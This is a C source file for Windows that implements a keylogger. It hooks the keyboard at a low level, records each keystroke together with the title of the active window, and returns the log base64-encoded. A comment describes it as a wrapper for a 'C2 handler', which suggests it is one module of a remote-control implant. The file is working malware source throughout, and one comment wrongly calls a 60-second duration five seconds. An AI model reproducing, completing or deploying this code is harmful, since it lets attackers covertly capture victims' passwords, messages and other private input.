#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

// Declare base64_encode function
extern char* base64_encode(const unsigned char* data, size_t data_len);

#define MAX_KEYLOG_SIZE 8192
#define KEYLOG_DURATION 60000  // Capture for 5 seconds

// Global buffer to store keystrokes
static char g_keylog_buffer[MAX_KEYLOG_SIZE];
static int g_keylog_pos = 0;
static CRITICAL_SECTION g_keylog_cs;
static BOOL g_keylog_initialized = FALSE;
static char g_last_window[256] = {0};

// Initialize keylogger
void InitKeylogger() {
    if (!g_keylog_initialized) {
        InitializeCriticalSection(&g_keylog_cs);
        g_keylog_initialized = TRUE;
        memset(g_keylog_buffer, 0, MAX_KEYLOG_SIZE);
        g_keylog_pos = 0;
    }
}

// Append string to keylog buffer (thread-safe)
void AppendToKeylog(const char* str) {
    EnterCriticalSection(&g_keylog_cs);
    
    int len = strlen(str);
    if (g_keylog_pos + len < MAX_KEYLOG_SIZE - 1) {
        strcpy(g_keylog_buffer + g_keylog_pos, str);
        g_keylog_pos += len;
    }
    
    LeaveCriticalSection(&g_keylog_cs);
}

// Convert virtual key code to readable string
void VKeyToString(DWORD vkCode, BOOL shift, char* output, int maxLen) {
    // Handle special keys
    switch (vkCode) {
        case VK_RETURN: snprintf(output, maxLen, "[ENTER]"); return;
        case VK_BACK: snprintf(output, maxLen, "[BACKSPACE]"); return;
        case VK_TAB: snprintf(output, maxLen, "[TAB]"); return;
        case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT: output[0] = '\0'; return;
        case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL: snprintf(output, maxLen, "[CTRL]"); return;
        case VK_MENU: case VK_LMENU: case VK_RMENU: snprintf(output, maxLen, "[ALT]"); return;
        case VK_ESCAPE: snprintf(output, maxLen, "[ESC]"); return;
        case VK_SPACE: snprintf(output, maxLen, " "); return;
        case VK_DELETE: snprintf(output, maxLen, "[DEL]"); return;
        case VK_UP: snprintf(output, maxLen, "[UP]"); return;
        case VK_DOWN: snprintf(output, maxLen, "[DOWN]"); return;
        case VK_LEFT: snprintf(output, maxLen, "[LEFT]"); return;
        case VK_RIGHT: snprintf(output, maxLen, "[RIGHT]"); return;
        case VK_HOME: snprintf(output, maxLen, "[HOME]"); return;
        case VK_END: snprintf(output, maxLen, "[END]"); return;
        case VK_PRIOR: snprintf(output, maxLen, "[PGUP]"); return;
        case VK_NEXT: snprintf(output, maxLen, "[PGDN]"); return;
        case VK_INSERT: snprintf(output, maxLen, "[INS]"); return;
        case VK_CAPITAL: snprintf(output, maxLen, "[CAPS]"); return;
    }
    
    // Handle F1-F12
    if (vkCode >= VK_F1 && vkCode <= VK_F12) {
        snprintf(output, maxLen, "[F%d]", vkCode - VK_F1 + 1);
        return;
    }
    
    // Handle number pad
    if (vkCode >= VK_NUMPAD0 && vkCode <= VK_NUMPAD9) {
        snprintf(output, maxLen, "%d", vkCode - VK_NUMPAD0);
        return;
    }
    
    // Handle regular keys using ToAscii
    BYTE keyboardState[256];
    GetKeyboardState(keyboardState);
    
    WORD asciiValue;
    int result = ToAscii(vkCode, MapVirtualKey(vkCode, MAPVK_VK_TO_VSC), keyboardState, &asciiValue, 0);
    
    if (result == 1) {
        char ch = (char)(asciiValue & 0xFF);
        if (ch >= 32 && ch <= 126) {  // Printable ASCII
            output[0] = ch;
            output[1] = '\0';
        } else {
            snprintf(output, maxLen, "[0x%02X]", (unsigned char)ch);
        }
    } else {
        output[0] = '\0';
    }
}

// Low-level keyboard hook callback
LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = pKeyboard->vkCode;
        
        // Get current window title
        char windowTitle[256];
        HWND hwnd = GetForegroundWindow();
        if (hwnd != NULL) {
            GetWindowTextA(hwnd, windowTitle, sizeof(windowTitle));
        } else {
            strcpy(windowTitle, "Unknown");
        }
        
        // Log window change
        if (strcmp(windowTitle, g_last_window) != 0) {
            char windowLog[300];
            snprintf(windowLog, sizeof(windowLog), "\n[Window: %s]\n", windowTitle);
            AppendToKeylog(windowLog);
            strncpy(g_last_window, windowTitle, sizeof(g_last_window) - 1);
        }
        
        // Check if Shift is pressed
        BOOL shift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
        
        // Convert key to string
        char keyStr[32];
        VKeyToString(vkCode, shift, keyStr, sizeof(keyStr));
        
        if (keyStr[0] != '\0') {
            AppendToKeylog(keyStr);
        }
    }
    
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Message loop for the hook
DWORD WINAPI KeyloggerThread(LPVOID param) {
    DWORD duration = (DWORD)(DWORD_PTR)param;
    
    // Install keyboard hook
    HHOOK hKeyboardHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardHookProc, GetModuleHandle(NULL), 0);
    
    if (!hKeyboardHook) {
        return 1;
    }
    
    // Run message loop with timeout
    MSG msg;
    DWORD startTime = GetTickCount();
    
    while (GetTickCount() - startTime < duration) {
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        Sleep(10);
    }
    
    // Unhook
    UnhookWindowsHookEx(hKeyboardHook);
    
    return 0;
}

// Start keylogger - wrapper function for C2 handler
// Returns keystroke log data (no console output)
char* start_keylogger() {
    char *result = (char*)malloc(MAX_KEYLOG_SIZE);
    if (!result) return NULL;
    
    // Initialize keylogger
    InitKeylogger();
    
    // Clear previous data
    EnterCriticalSection(&g_keylog_cs);
    memset(g_keylog_buffer, 0, MAX_KEYLOG_SIZE);
    g_keylog_pos = 0;
    memset(g_last_window, 0, sizeof(g_last_window));
    LeaveCriticalSection(&g_keylog_cs);
    
    // Add header
    AppendToKeylog("=== Keylogger Started ===\n");
    
    // Start keylogger thread
    HANDLE hThread = CreateThread(NULL, 0, KeyloggerThread, (LPVOID)(DWORD_PTR)KEYLOG_DURATION, 0, NULL);
    
    if (hThread) {
        // Wait for keylogger to finish
        WaitForSingleObject(hThread, KEYLOG_DURATION + 1000);
        CloseHandle(hThread);
    } else {
        AppendToKeylog("\n[Error: Failed to start keylogger thread]\n");
    }
    
    AppendToKeylog("\n=== Keylogger Stopped ===\n");
    
    // Copy buffer to result and encode with base64
    EnterCriticalSection(&g_keylog_cs);
    if (g_keylog_pos > 0) {
        strncpy(result, g_keylog_buffer, MAX_KEYLOG_SIZE - 1);
        result[MAX_KEYLOG_SIZE - 1] = '\0';
    } else {
        strcpy(result, "=== No keystrokes captured ===\n");
    }
    LeaveCriticalSection(&g_keylog_cs);
    
    // Encode result with base64
    char* encoded_result = base64_encode((unsigned char*)result, strlen(result));
    free(result);
    
    return encoded_result;
}
